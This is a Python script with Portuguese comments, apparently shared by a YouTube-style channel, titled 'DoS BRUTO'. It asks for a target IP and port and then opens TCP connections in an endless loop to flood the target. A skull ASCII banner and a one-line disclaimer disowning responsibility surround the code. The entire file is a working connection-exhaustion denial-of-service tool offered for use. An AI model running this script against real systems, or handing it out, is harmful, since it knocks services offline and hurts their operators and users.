#!/usr/bin/python

import sys
import socket

# Função para iniciar o ataque DoS
def iniciar_ataque(ip, porta):
    sent = 0
    arr = []
    c = 0
    while True:
        try:
            arr.append(socket.create_connection((ip, porta)))
            arr[c].send("Ataque DoS".encode('utf-8'))
            print("Destruindo o Alvo!")
            c += 1
        except socket.error:
            print("[+] O alvo parou de responder")

# Função para exibir o desenho da caveira em texto
def exibir_desenho_caveira():
    desenho_caveira = """
          ░░░░░░░
     ░░░░░░░░░░░░░░░░░
   │░░░░░░░░░░░░░░░░░░░│
   │░░░░░░░░░░░░░░░░░░░│
  ░└┐░░░░░░░░░░░░░░░░░┌┘░
  ░░└┐░░░░░░░░░░░░░░░┌┘░░
  ░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░
   ░│██████▌░░░▐██████│░
   ░│▐███▀▀░░▄░░▀▀███▌│░
   ─┘░░░░░░░▐█▌░░░░░░░└─
   ░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░
     ─┘██▌░░░░░░░▐██└─
     ░░▐█─┬┬┬┬┬┬┬─█▌░░
     ░░░▀┬┼┼┼┼┼┼┼┬▀░░░
      ░░░└┴┴┴┴┴┴┴┘░░░
        ░░░░░░░░░░░
    """
    print(desenho_caveira)

# Início do programa
if __name__ == "__main__":
    title = "DoS BRUTO"
    print("#" * 40)  
    print("#" + " " * 9 + title.center(22) + " " * 9 + "#")  
    print("#" * 40)
    print('BY DEFAU1T1')
    print('SE INSCREVA NO CANAL')
    print('ATENÇÃO: USE EM AMBIENTES CONTROLADOS" NÃO ME RESPONSABILIZO!')  
    exibir_desenho_caveira()

    ip = input("Informe o IP do alvo: ")
    porta = input("Informe a PORTA do alvo: ")
    porta = int(porta)

    iniciar_ataque(ip, porta)
